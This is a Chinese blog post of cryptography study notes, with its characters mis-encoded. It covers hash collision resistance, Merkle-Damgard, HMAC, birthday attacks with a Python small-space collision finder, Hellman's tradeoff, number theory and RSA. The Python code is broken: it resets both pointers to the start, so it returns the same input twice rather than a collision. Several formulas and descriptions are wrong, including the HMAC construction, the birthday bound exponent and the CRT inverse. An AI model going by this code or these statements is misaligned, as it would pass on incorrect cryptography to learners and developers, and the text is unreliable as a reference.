‡æ˜¯ä¸ºäº†è¯´æ˜ï¼Œ$s$ä¸æ˜¯ä¿å¯†çš„ï¼Œå³ä½¿å¯¹æ‰‹è·å¾—äº†$s$ï¼Œå‡½æ•°Hä»ç„¶å…·æœ‰æŠ—ç¢°æ’æ€§ã€‚</p><blockquote><p>å®é™…åº”ç”¨ä¸­åŸºæœ¬ä¸Šè¿˜æ˜¯ä½¿ç”¨ä¸å¸¦å¯†é’¥çš„hashå‡½æ•°ã€‚</p></blockquote><p><strong>ç¬¬äºŒåŸåƒæŠ—ç¢°æ’æ€§ï¼š</strong> å·²çŸ¥Hå’Œxï¼Œpptå¯¹æ‰‹éš¾ä»¥æ‰¾åˆ°$x_1\neq x$ï¼Œä½¿$H^s(x_1)&#x3D;H^s(x)$</p><blockquote><p>æŠ—ç¢°æ’æ€§çš„hashå‡½æ•°ä¹Ÿæ˜¯æŠ—ç¬¬äºŒåŸåƒç¢°æ’çš„ï¼ŒæŠ—ç¬¬äºŒåŸåƒç¢°æ’çš„ä¹Ÿæ˜¯æŠ—åŸåƒç¢°æ’çš„ã€‚</p></blockquote><p><strong>åŸåƒæŠ—æ€§ï¼š</strong> å·²çŸ¥Hå’Œyï¼ˆy&#x3D;H(x)ï¼‰ï¼Œpptå¯¹æ‰‹èƒ½æ‰¾åˆ°ä¸€ä¸ª$x_1$ï¼ˆæ— è®ºæ˜¯å¦ç­‰äºxï¼‰ä½¿å¾—$H^s(x_1)&#x3D;y$ã€‚</p><blockquote><p>åŸåƒæŠ—æ€§åŸºæœ¬ä¸Šæ„å‘³ç€$H^s$çš„å•å‘æ€§ã€‚</p></blockquote><h2 id="6-2The-Merkle-Damgard-Transform"><a href="#6-2The-Merkle-Damgard-Transform" class="headerlink" title="6.2The Merkle-Damgard Transform"></a>6.2The Merkle-Damgard Transform</h2><p><strong>ç®€è¦ï¼š</strong> $Merkle-Damgard$å˜æ¢ï¼Œå³MDå˜æ¢ï¼Œæ˜¯ä¸€ç§å°†å®šé•¿å“ˆå¸Œå‡½æ•°è½¬æ¢æˆå…¨åŠŸèƒ½ï¼ˆå¯å˜é•¿åº¦ï¼‰å“ˆå¸Œå‡½æ•°çš„æŠ€æœ¯ã€‚<br><strong>å®šé•¿å“ˆå¸Œ</strong>ï¼šMD5ã€SHA-256ç­‰ã€‚<br><img src="/2025/04/28/Introduction%20To%20Modern%20Cryptography%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/file-20250422161507480.png"><br><strong>å˜æ¢æ­¥éª¤</strong>ï¼š</p><ul><li>å°†æ•°æ®åˆ†å‰²æˆå¤šä¸ªå›ºå®šå¤§å°çš„å—ï¼Œæ¯ä¸ªå—å¤§å°é€šå¸¸ç­‰äºå®šé•¿å“ˆå¸Œå‡½æ•°çš„é•¿åº¦</li><li>è®¾ç½®$IV$</li><li>å¯¹æ¯ä¸ªå—è¿›è¡Œå‹ç¼©ã€‚ï¼ˆä½¿ç”¨å®šé•¿hashå‡½æ•°å°†å‰ä¸€ä¸ªå‹ç¼©ç»“æœå’Œå½“å‰å—è¿›è¡Œå‹ç¼©ï¼‰</li><li>æœ€åå¾—åˆ°çš„æœ€åä¸€ä¸ªå‹ç¼©è¾“å‡ºä¾¿æ˜¯è¯¥å…¨åŠŸèƒ½hashå‡½æ•°çš„è¾“å‡º</li></ul><h2 id="6-3-Hash-and-MACå’ŒHMAC"><a href="#6-3-Hash-and-MACå’ŒHMAC" class="headerlink" title="6.3 Hash-and-MACå’ŒHMAC"></a>6.3 Hash-and-MACå’ŒHMAC</h2><h3 id="6-3-1-Hash-and-MAC"><a href="#6-3-1-Hash-and-MAC" class="headerlink" title="6.3.1 Hash-and-MAC"></a>6.3.1 Hash-and-MAC</h3><p><strong>å®ç°ï¼š</strong> é¦–å…ˆä½¿ç”¨Hashå‡½æ•°å¯¹æ¶ˆæ¯è¿›è¡Œæ‘˜è¦ï¼Œç„¶åä½¿ç”¨å¯†é’¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œç­¾åï¼Œå¾—åˆ°MAC</p><p><strong>ç‰¹ç‚¹ï¼š</strong></p><ul><li>ç®€å•é«˜æ•ˆ</li><li>å®‰å…¨å¯é <br><strong>é™åˆ¶ï¼š</strong></li><li>å¯†é’¥ç®¡ç†</li><li>å•å‘æ€§</li></ul><h3 id="6-3-2-HMAC"><a href="#6-3-2-HMAC" class="headerlink" title="6.3.2 HMAC"></a>6.3.2 HMAC</h3><p>ä½¿ç”¨hashè¿ç®—çš„æ¶ˆæ¯è®¤è¯ç MAC<br><strong>æ„é€ ï¼š</strong></p><ul><li>å¯¹å¯†é’¥è¿›è¡Œé¢„å¤„ç†ï¼Œä½¿å…¶ä¸å“ˆå¸Œå‡½æ•°çš„è¾“å…¥é•¿åº¦ç›¸åŒï¼ˆé€šå¸¸æ˜¯å“ˆå¸Œå‡½æ•°çš„å—é•¿åº¦ï¼‰ã€‚</li><li>å°†ç»è¿‡é¢„å¤„ç†çš„å¯†é’¥ä¸æ¶ˆæ¯è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°æ–°çš„è¾“å…¥ã€‚</li><li>å¯¹æ–°çš„è¾“å…¥ä½¿ç”¨å“ˆå¸Œå‡½æ•°è¿›è¡Œå¤šè½®è¿­ä»£è®¡ç®—ï¼Œå¾—åˆ°æ¶ˆæ¯è®¤è¯ç ã€‚</li></ul><p><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>å®‰å…¨æ€§é«˜</li><li>çµæ´»æ€§å¼º</li></ul><h3 id="6-4-1-ç”Ÿæ—¥æ”»å‡»"><a href="#6-4-1-ç”Ÿæ—¥æ”»å‡»" class="headerlink" title="6.4.1 ç”Ÿæ—¥æ”»å‡»"></a>6.4.1 ç”Ÿæ—¥æ”»å‡»</h3><p><strong>ä»‹ç»ï¼š</strong> åœ¨ä¸€ä¸ªå¤§å°ä¸ºNçš„è¾“å‡ºç©ºé—´ä¸­ï¼Œéå†$\Theta(\sqrt N)$æ—¶æ‰¾åˆ°ç¢°æ’çš„æ¦‚ç‡ä¸º$\frac12$å·¦å³ã€‚</p><blockquote><p>è‹¥$N&#x3D;2^l$ï¼Œåˆ™$\Theta(\sqrt N)&#x3D;\Theta(2^{\frac12})$</p></blockquote><h4 id="æœ‰æ„ä¹‰ç¢°æ’ï¼š"><a href="#æœ‰æ„ä¹‰ç¢°æ’ï¼š" class="headerlink" title="æœ‰æ„ä¹‰ç¢°æ’ï¼š"></a><strong>æœ‰æ„ä¹‰ç¢°æ’ï¼š</strong></h4><p>æ¡ä»¶åŒä¸Šï¼Œéå†ä¸¤ç»„$\Theta(2^{\frac12})$çš„ä¸åŒæ¶ˆæ¯ã€‚<br>ä¸¤ç»„æ¶ˆæ¯å­˜åœ¨ç¢°æ’çš„æ¦‚ç‡ä¹Ÿä¸º$\frac12$å·¦å³ã€‚</p><h3 id="6-4-2-å°ç©ºé—´ç”Ÿæ—¥æ”»å‡»"><a href="#6-4-2-å°ç©ºé—´ç”Ÿæ—¥æ”»å‡»" class="headerlink" title="6.4.2 å°ç©ºé—´ç”Ÿæ—¥æ”»å‡»"></a>6.4.2 å°ç©ºé—´ç”Ÿæ—¥æ”»å‡»</h3><p>ä½¿ç”¨Floydå¾ªç¯æŸ¥æ‰¾ç®—æ³•ï¼Œä½¿æˆåŠŸæ¦‚ç‡å’Œè¿è¡Œæ—¶é—´ä¸åŸç‰ˆå¤§è‡´ç›¸åŒï¼Œä½†åªéœ€å¸¸æ•°å†…å­˜ã€‚</p><blockquote><p>å¦‚æœç»ƒè¿‡ç®—æ³•é¢˜ï¼Œåº”è¯¥ä¼šçŸ¥é“<strong>å¿«æ…¢æŒ‡é’ˆæ³•</strong>ï¼Œå…¶å®æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œæ…¢æŒ‡é’ˆåšä¸€æ¬¡è¿ç®—ï¼Œæ…¢æŒ‡é’ˆåšä¸¤æ¬¡è¿ç®—ï¼Œå¦‚æœæœ‰å¾ªç¯ï¼Œæ€»ä¼šç›¸é‡ã€‚</p></blockquote><p><strong>æ­¥éª¤ï¼š</strong> </p><ul><li>é¦–å…ˆé€‰æ‹©ä¸€ä¸ªéšæœºçš„æ¶ˆæ¯$x_0$ï¼Œèµ‹å€¼$x:&#x3D;x_0,xâ€™:&#x3D;x_0$</li><li>åœ¨ç¬¬$i$æ¬¡è¿­ä»£æ—¶æ¯”è¾ƒ$x_i&#x3D;H(x_{i-1})å’Œx_iâ€™&#x3D;H(H(x_{i-1}â€™))$çš„å€¼</li><li>å¦‚æœ$x_i &#x3D; x_iâ€™$ï¼Œè¯´æ˜å‘ç”Ÿäº†å†²çªã€‚</li><li>ï¼ˆç›´æ¥ç¢°æ’ï¼‰ä¸”å¦‚æœ$x_{i-1}\neq H(x_{i-1}â€™)$ï¼Œåˆ™å†²çªå¯¹ä¸º$x_{i-1}\neq H(x_{i-1}â€™)$</li><li>ï¼ˆé—´æ¥ç¢°æ’ï¼‰è€Œå¦‚æœ$x_{i-1} &#x3D; H(x_{i-1}â€™)$ï¼Œåˆ™è¯´æ˜ç¢°æ’å¯èƒ½å‘ç”Ÿåœ¨æ›´æ—©çš„æ­¥éª¤ä¸­ã€‚ä½†ç”±äºhashå€¼æ²¡æœ‰è¢«è®°å½•ï¼Œå› æ­¤è¿˜éœ€è¦å†æ¬¡è¿­ä»£</li><li>å­˜å‚¨æ‰¾åˆ°çš„ç¼–å·$i$ï¼Œå¹¶å°†$x&#x3D;x_0,xâ€™&#x3D;x_0$ï¼Œé‡ç½®åˆå§‹å€¼ä¸º$x_0$</li><li>è¿­ä»£åˆ°$i$,åœ¨æ¯ä¸€æ­¥$j$ä¸­ï¼Œæ£€æŸ¥$H(x_j)&#x3D;H(x_jâ€™)$</li><li>è‹¥æ‰¾åˆ°ï¼Œåˆ™æ‰¾åˆ°äº†ç¢°æ’ï¼Œè¿”å›$x_j$å’Œ$x_jâ€™$</li><li>å¦åˆ™ï¼Œä»¤$x_j&#x3D;H(x_j)$å’Œ$x_jâ€™&#x3D;H(x_jâ€™)$<br><strong>ä»£ç å®ç°:</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">random_binary_string</span>(<span class="hljs-params">length = <span class="hljs-number">16</span></span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(<span class="hljs-string">&#x27;01&#x27;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">H</span>(<span class="hljs-params">x</span>):<br><span class="hljs-keyword">return</span> hashlib.sha256(x.encode()).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SmallSpaceBirthdayAttack</span>():<br>x_0 = random_binary_string()<br>x = x_0<br>x_1 = x_0<br>i = <span class="hljs-number">0</span><br><br><span class="hljs-comment">#å¯»æ‰¾ç¢°æ’</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>x = H(x)<br>x_1 = H(H(x_1))<br><br><span class="hljs-keyword">if</span> x == x_1:<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>i += <span class="hljs-number">1</span><br><br><span class="hljs-comment">#å›æº¯ï¼Œå¯»æ‰¾å…·ä½“ç¢°æ’ç‚¹</span><br>x = x_0<br>x_1 = x_0<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br><span class="hljs-keyword">if</span> H(x) == H(x_1):<br><span class="hljs-keyword">return</span> (x,x_1)<br><span class="hljs-keyword">else</span>:<br>x = H(x)<br>x_1 = H(x_1)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>ans = SmallSpaceBirthdayAttack()<br><span class="hljs-keyword">if</span> ans:<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NOï¼ï¼ï¼&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="æœ‰æ„ä¹‰ç¢°æ’"><a href="#æœ‰æ„ä¹‰ç¢°æ’" class="headerlink" title="æœ‰æ„ä¹‰ç¢°æ’"></a>æœ‰æ„ä¹‰ç¢°æ’</h4><p><strong>å®ç°æ€æƒ³ï¼š</strong> å°†ä¸¤ä¸ªç±»å‹ä¸åŒçš„å¯é€‰æ‹©å¥å­æ˜ å°„ä¸ºäºŒè¿›åˆ¶ï¼Œä¾¿å¯ä»¥ä½¿ç”¨ä¸Šè¾¹çš„ç®—æ³•<br><strong>æ˜ å°„æ–¹æ³•ï¼š</strong> ä¾‹å¦‚æ‰¾ä¸¤ä¸ªè¯­ä¹‰ç›¸åçš„å¥å­ï¼Œ<br>$type 0: Alice is a good&#x2F;great and honest&#x2F;trustworthy worker&#x2F;employee.$<br>$type 1: Alice is a bad&#x2F;lousy and annoying&#x2F;irritating worker&#x2F;employee.$<br>å°†ç±»å‹0&#x2F;1æ˜ å°„åˆ°äºŒè¿›åˆ¶çš„é¦–æ•°å­—ï¼Œå‰©ä¸‹çš„æŒ‰ç…§æ¯ä¸ªç±»å‹ä¸­çš„æ¯ä¸ªå¯é€‰å•è¯æ˜¯é€‰çš„ç¬¬ä¸€ä¸ªè¿˜æ˜¯ç¬¬äºŒä¸ªæ¥æ˜ å°„ï¼Œå¦‚<br>$g(0000) &#x3D; Alice is a good and honest worker.$<br>$g(1101) &#x3D; Alice is a lousy and annoying employee.$</p><h3 id="6-4-3-æ—¶ç©ºæŠ˜ä¸­æ”»å‡»ï¼ˆHellmanâ€™s-time-space-tradeoff-ï¼‰"><a href="#6-4-3-æ—¶ç©ºæŠ˜ä¸­æ”»å‡»ï¼ˆHellmanâ€™s-time-space-tradeoff-ï¼‰" class="headerlink" title="6.4.3 æ—¶ç©ºæŠ˜ä¸­æ”»å‡»ï¼ˆHellmanâ€™s time&#x2F;space tradeoff.ï¼‰"></a>6.4.3 æ—¶ç©ºæŠ˜ä¸­æ”»å‡»ï¼ˆHellmanâ€™s time&#x2F;space tradeoff.ï¼‰</h3><p><strong>æ—¶é—´&#x2F;ç©ºé—´æŠ˜ä¸­</strong>ï¼šé€šè¿‡é¢„å¤„ç†å’Œå­˜å‚¨ï¼Œå¯ä»¥åœ¨å­˜å‚¨ç©ºé—´å’Œè®¡ç®—æ—¶é—´ä¹‹é—´è¿›è¡Œæƒè¡¡ï¼Œä»è€Œåœ¨åˆç†çš„æ—¶é—´å’Œç©ºé—´å¤æ‚åº¦å†…æ‰¾åˆ°å“ˆå¸Œå‡½æ•°çš„é¢„åƒã€‚</p><h4 id="Hellman-çš„æ—¶é—´-ç©ºé—´æŠ˜ä¸­"><a href="#Hellman-çš„æ—¶é—´-ç©ºé—´æŠ˜ä¸­" class="headerlink" title="Hellman çš„æ—¶é—´&#x2F;ç©ºé—´æŠ˜ä¸­"></a>Hellman çš„æ—¶é—´&#x2F;ç©ºé—´æŠ˜ä¸­</h4><p><strong>æ–¹æ³•</strong>ï¼šHellman æå‡ºäº†ä¸€ç§æ›´é€šç”¨çš„æ—¶é—´&#x2F;ç©ºé—´æƒè¡¡æ–¹æ³•ï¼Œé€‚ç”¨äºä»»æ„å‡½æ•°Hã€‚</p><p><strong>æ­¥éª¤</strong>ï¼š</p><ol><li><p><strong>é€‰æ‹©å‚æ•°</strong>ï¼šé€‰æ‹©å‚æ•°$s$å’Œ$t$ã€‚</p></li><li><p><strong>ç”Ÿæˆè¡¨</strong>ï¼šé€‰æ‹©$s$ä¸ªå‡åŒ€éšæœºçš„èµ·å§‹ç‚¹$SP_1â€‹,â€¦,SP_sâ€‹âˆˆ{0,1}^â„“$ã€‚å¯¹äºæ¯ä¸ªèµ·å§‹ç‚¹$SP_i$â€‹ï¼Œè®¡ç®—å¯¹åº”çš„ç»ˆç‚¹$EPiâ€‹:&#x3D;H^{(t)}(SP_iâ€‹)ï¼ˆå³Hçš„tæ¬¡è¿­ä»£ï¼‰$ã€‚</p></li><li><p><strong>å­˜å‚¨</strong>ï¼šå°†æ‰€æœ‰å¯¹$(SP_iâ€‹,EP_iâ€‹)$å­˜å‚¨åœ¨è¡¨ä¸­ï¼ŒæŒ‰ç»ˆç‚¹æ’åºã€‚</p></li><li><p><strong>åœ¨çº¿é˜¶æ®µ</strong>ï¼šç»™å®š$y$ï¼Œæ£€æŸ¥$y,H(y),â€¦,H^{(tâˆ’1)}(y)$æ˜¯å¦ä¸è¡¨ä¸­çš„æŸä¸ªç»ˆç‚¹åŒ¹é…ã€‚å¦‚æœæ‰¾åˆ°åŒ¹é…ï¼Œåˆ™è®¡ç®—$H^{(tâˆ’jâˆ’1)}(SP_iâ€‹)$å¹¶æ£€æŸ¥æ˜¯å¦ä¸º$y$çš„åŸåƒã€‚</p></li></ol><h1 id="9-æ•°è®ºä¸å¯†ç å›°éš¾å‡è®¾"><a href="#9-æ•°è®ºä¸å¯†ç å›°éš¾å‡è®¾" class="headerlink" title="9.æ•°è®ºä¸å¯†ç å›°éš¾å‡è®¾"></a>9.æ•°è®ºä¸å¯†ç å›°éš¾å‡è®¾</h1><h3 id="9-1-1è´¨æ•°å’Œå¯é™¤æ€§"><a href="#9-1-1è´¨æ•°å’Œå¯é™¤æ€§" class="headerlink" title="9.1.1è´¨æ•°å’Œå¯é™¤æ€§"></a>9.1.1è´¨æ•°å’Œå¯é™¤æ€§</h3><p><strong>å‘½é¢˜1ï¼š</strong> å¯¹æ­£æ•´æ•°aï¼Œbï¼Œæœ‰å”¯ä¸€qï¼Œræ»¡è¶³$a&#x3D;qb+r$ï¼Œå…¶ä¸­$r\in[0,b)$<br><strong>å‘½é¢˜2ï¼š</strong> æ­£æ•´æ•°aï¼Œbï¼Œå­˜åœ¨æ•´æ•°Xï¼ŒYï¼Œæ»¡è¶³$Xa+Yb&#x3D;gcdï¼ˆaï¼Œbï¼‰$ï¼Œå…¶ä¸­$gcd(a,b)$æ˜¯è¿™ç§å½¢å¼èƒ½å¤Ÿè¡¨ç¤ºçš„æœ€å°æ­£æ•´æ•°ã€‚<br><strong>å‘½é¢˜3ï¼š</strong> å¦‚æœ$c|abï¼Œgcd(a,c)&#x3D;1$ï¼Œåˆ™æœ‰$c|b$<br><strong>å‘½é¢˜4ï¼š</strong> å¦‚æœ$a|N,b|N,å¹¶ä¸”gcd(a,b)&#x3D;1ï¼Œåˆ™ab|N$</p><h3 id="9-1-2æ¨¡è¿ç®—"><a href="#9-1-2æ¨¡è¿ç®—" class="headerlink" title="9.1.2æ¨¡è¿ç®—"></a>9.1.2æ¨¡è¿ç®—</h3><p><strong>å‘½é¢˜ï¼š</strong> å¯¹æ•´æ•°bï¼ŒNï¼Œå…¶ä¸­$b\geq 1$å¹¶ä¸”$N&gt;1$ã€‚å½“ä¸”ä»…å½“$gcd(b,N)&#x3D;1$æ—¶bå…³äºNå¯é€†ã€‚</p><h3 id="9-1-3ç¾¤"><a href="#9-1-3ç¾¤" class="headerlink" title="9.1.3ç¾¤"></a>9.1.3ç¾¤</h3><p><strong>å®šä¹‰ï¼š</strong> ç¾¤æ˜¯ç”±é›†åˆGå’ŒäºŒå…ƒè¿ç®—$\circ$ç»„æˆã€‚</p><ul><li><strong>é—­åˆæ€§ï¼š</strong> å¯¹äºgï¼Œh$\in G$ï¼Œ$g\circ h \in G$</li><li><strong>å­˜åœ¨å•ä½å…ƒï¼š</strong> å­˜åœ¨eï¼Œä½¿$e\circ g &#x3D; g &#x3D; g\circ e$</li><li><strong>å­˜åœ¨é€†å…ƒï¼š</strong> å­˜åœ¨hï¼Œä½¿å¾—$g\circ h &#x3D; h\circ g &#x3D; e$</li><li><strong>ç»“åˆæ€§ï¼š</strong> $(g_1\circ g_2)\circ g_3 &#x3D; g_1 \circ (g_2 \circ g_3)$<br>é˜¶ï¼šè‹¥å…ƒç´ æ•°æœ‰é™ï¼Œç§°ç¾¤ä¸ºæœ‰é™ç¾¤ï¼Œç”¨|G|è¡¨ç¤ºç¾¤çš„é˜¶ã€‚<br><strong>Abelianç¾¤ï¼š</strong> å…·æœ‰<strong>äº¤æ¢æ€§</strong>ï¼Œå³æ»¡è¶³$g\circ h &#x3D; h\circ g$çš„ç¾¤ã€‚<br><strong>å­ç¾¤ï¼š</strong> å¦‚æœç¾¤$H\subseteq G$ ï¼Œä¸”Hä¸Gè¿ç®—ç›¸åŒï¼Œåˆ™Hæ˜¯Gçš„å­ç¾¤ã€‚<br><strong>å¹³å‡¡å­ç¾¤ï¼š</strong> Gæˆ–{1}ï¼ˆç±»æ¯”å¹³å‡¡å› å­ï¼‰</li></ul><p><strong>å®šç†ï¼š</strong> å·²çŸ¥$N&#x3D;\Pi_ip_i^{e_i}ï¼Œå…¶ä¸­e_i\geq 1$ï¼Œåˆ™æœ‰$\phi(N)&#x3D;\Pi_ip_i^{e_i-1}(p_i-1)$</p><h3 id="9-1-4-ä¹˜æ³•ç¾¤ï¼šæ¬§æ‹‰å‡½æ•°"><a href="#9-1-4-ä¹˜æ³•ç¾¤ï¼šæ¬§æ‹‰å‡½æ•°" class="headerlink" title="9.1.4 ä¹˜æ³•ç¾¤ï¼šæ¬§æ‹‰å‡½æ•°"></a>9.1.4 ä¹˜æ³•ç¾¤ï¼šæ¬§æ‹‰å‡½æ•°</h3><p><strong>å®šç†ï¼š</strong> è®¾$N&gt;1$æ˜¯ä¸€ä¸ªæ•´æ•°ã€‚é‚£ä¹ˆ$Z^*_N$æ˜¯å…³äºæ¨¡$N$çš„ä¹˜æ³•è¿ç®—çš„ä¸€ä¸ªé˜¿è´å°”ç¾¤ã€‚<br><strong>å®šç†ï¼š</strong> è®¾$N&#x3D;\Pi _ip_i^{e_i}$ï¼Œå…¶ä¸­${p_i}$æ˜¯ä¸åŒçš„ç´ æ•°ï¼Œ$e_i\geq 1$ã€‚é‚£ä¹ˆ$\Phi(N)&#x3D;\Pi _ip_i^{e_i-1}(p_i-1)$</p><p><strong>æ¨è®ºï¼š</strong> å–ä»»æ„æ•´æ•°$N&gt;1$å’Œ$a\in Z^*_N$ã€‚åˆ™$a^{\Phi(N)}&#x3D;1 \mod N$</p><h3 id="9-1-5ä¸­å›½å‰©ä½™å®šç†ï¼ˆCRTï¼‰"><a href="#9-1-5ä¸­å›½å‰©ä½™å®šç†ï¼ˆCRTï¼‰" class="headerlink" title="9.1.5ä¸­å›½å‰©ä½™å®šç†ï¼ˆCRTï¼‰"></a>9.1.5ä¸­å›½å‰©ä½™å®šç†ï¼ˆCRTï¼‰</h3><p>å·²çŸ¥N&#x3D;pqï¼Œæ±‚$x\mod m$ï¼Œä»¤$m_1m_2&#x3D;M$<br>$x\equiv a \mod m_1$<br>$x\equiv b \mod m_2$<br><strong>æ±‚è§£è¿‡ç¨‹ï¼š</strong> </p><ul><li>æ±‚$M_1ï¼ŒM_2$ï¼Œå…¶ä¸­$M_1&#x3D;\frac{M}{m_1}M_2&#x3D;\frac{M}{m_2}$</li><li>æ±‚$M_1^{-1},M_2^{-1}$ï¼Œå…¶ä¸­$M_1^{-1}\equiv M_1 \mod m_1ï¼ŒM_2^{-1}$åŒç†</li><li>æ±‚$x\equiv aM_1M_1^{-1}+bM_2M_2^{-1} \mod M$</li></ul><h2 id="9-2-ç´ æ•°ã€åˆ†è§£ã€RSA"><a href="#9-2-ç´ æ•°ã€åˆ†è§£ã€RSA" class="headerlink" title="9.2 ç´ æ•°ã€åˆ†è§£ã€RSA"></a>9.2 ç´ æ•°ã€åˆ†è§£ã€RSA</h2><h3 id="9-2-1-ç”Ÿæˆéšæœºç´ æ•°"><a href="#9-2-1-ç”Ÿæˆéšæœºç´ æ•°" class="headerlink" title="9.2.1 ç”Ÿæˆéšæœºç´ æ•°"></a>9.2.1 ç”Ÿæˆéšæœºç´ æ•°</h3><p><strong>ç®—æ³•æ„é€ </strong>ï¼š<br>ä»1åˆ°$3n^2$è¿›è¡Œå¾ªç¯ï¼š</p><ul><li>éšæœºé€‰æ‹©ä¸€ä¸ªn-1ä½çš„äºŒè¿›åˆ¶æ•°$p_0$</li><li>å°†æœ€é«˜ä½è®¾ä¸º1ï¼Œå¾—åˆ°nä½æ•°p</li><li>è¿›è¡ŒMiller-Rabinæµ‹è¯•ï¼Œè¾“å…¥ä¸ºpå’Œå‚æ•°$1^n$</li><li>å¦‚æœè¾“å‡ºæ˜¯â€ç´ æ•°â€œï¼Œåˆ™è¿”å›p<br>å¦‚æœå†å°è¯•$3n^2$æ¬¡åæ²¡æœ‰æ‰¾åˆ°ç´ æ•°ï¼Œåˆ™è¿”å›å¤±è´¥ã€‚</li></ul><h3 id="9-2-2-ç´ æ€§æµ‹è¯•"><a href="#9-2-2-ç´ æ€§æµ‹è¯•" class="headerlink" title="9.2.2 ç´ æ€§æµ‹è¯•"></a>9.2.2 ç´ æ€§æµ‹è¯•</h3><h4 id="Miller-Rabin-ç´ æ€§æµ‹è¯•"><a href="#Miller-Rabin-ç´ æ€§æµ‹è¯•" class="headerlink" title="Miller-Rabin ç´ æ€§æµ‹è¯•"></a><strong>Miller-Rabin ç´ æ€§æµ‹è¯•</strong></h4><p><strong>ä»‹ç»ï¼š</strong> åŸºäºè´¹é©¬å°å®šç†å’ŒäºŒæ¬¡æ¢æµ‹å®šç†çš„éšæœºåŒ–ç®—æ³•<br><strong>äºŒæ¬¡æ¢æµ‹å®šç†ï¼š</strong> å¯¹äºç´ æ•°pï¼Œè‹¥$x^2\equiv 1 \mod p$ï¼Œåˆ™å°äºpçš„è§£åªæœ‰ä¸¤ä¸ªï¼Œ$x_1&#x3D;1,x_2&#x3D;p-1$<br><strong>æ­¥éª¤ï¼š</strong></p><ul><li>ä»¤$n-1&#x3D;2^kq$ï¼Œå…¶ä¸­$k&gt;0,q$ä¸ºå¥‡æ•°ï¼Œéšæœºé€‰å–æ•´æ•°$a,1&lt;a&lt;n-1$</li><li>è‹¥$a^q\mod n&#x3D;1$ï¼Œåˆ™næœ‰å¯èƒ½æ˜¯ç´ æ•°</li><li>å–æ•´æ•°$j$ï¼Œ$0\geq j &lt; k$ï¼Œè‹¥å­˜åœ¨$a^{2^j}\mod n &#x3D; n -1$ï¼Œåˆ™næœ‰å¯èƒ½æ˜¯ç´ æ•°ï¼›å¦åˆ™ï¼Œnä¸ºåˆæ•°</li></ul><p><strong>å®šç†ï¼š</strong> å¦‚æœNæ˜¯å¥‡æ•°ï¼Œä¸”ä¸æ˜¯ç´ æ•°çš„å¹‚ï¼Œé‚£ä¹ˆåœ¨$Z^*_N$ä¸­ï¼Œè‡³å°‘æœ‰ä¸€åŠçš„å…ƒç´ æ˜¯Næ˜¯åˆæ•°çš„å¼ºè§è¯ã€‚</p><h3 id="9-2-3-åˆ†è§£å‡è®¾"><a href="#9-2-3-åˆ†è§£å‡è®¾" class="headerlink" title="9.2.3 åˆ†è§£å‡è®¾"></a>9.2.3 åˆ†è§£å‡è®¾</h3><p>å› å¼åˆ†è§£å‡è®¾æ˜¯æŒ‡å­˜åœ¨ä¸€ä¸ªç›¸å¯¹çš„GenModulusï¼Œä½¿å¾—å› å¼åˆ†è§£å˜å¾—å›°éš¾ï¼Œå…¶ä¸­GenModulusæ˜¯ä¸€ä¸ªç”¨æ¥ç”Ÿæˆ$(N,p,q)$å¤šé¡¹å¼æ—¶é—´ç®—æ³•</p><h3 id="9-2-4-RSAå‡è®¾"><a href="#9-2-4-RSAå‡è®¾" class="headerlink" title="9.2.4 RSAå‡è®¾"></a>9.2.4 RSAå‡è®¾</h3><p>å‡è®¾å­˜åœ¨ä¸€ä¸ªGenRSAç®—æ³•ï¼Œä½¿å¾—RSAé—®é¢˜åœ¨å¤šé¡¹å¼æ—¶é—´å†…éš¾ä»¥è§£å†³ã€‚è¿™ä¸€å‡è®¾æ˜¯RSAå…¬é’¥å¯†ç å­¦å®‰å…¨æ€§çš„åŸºç¡€ã€‚<br><strong>eçš„é€‰æ‹©ï¼š</strong> æœ€å¸¸è§çš„é€‰æ‹©ä¸º65537ï¼Œåƒæ˜¯e&#x3D;3ç­‰å®¹æ˜“é­å—ä½åŠ å¯†æŒ‡æ•°æ”»å‡»</p><h2 id="9-3å¾ªç¯ç¾¤ä¸­çš„å¯†ç å­¦å‡è®¾"><a href="#9-3å¾ªç¯ç¾¤ä¸­çš„å¯†ç å­¦å‡è®¾" class="headerlink" title="9.3å¾ªç¯ç¾¤ä¸­çš„å¯†ç å­¦å‡è®¾"></a>9.3å¾ªç¯ç¾¤ä¸­çš„å¯†ç å­¦å‡è®¾</h2><h3 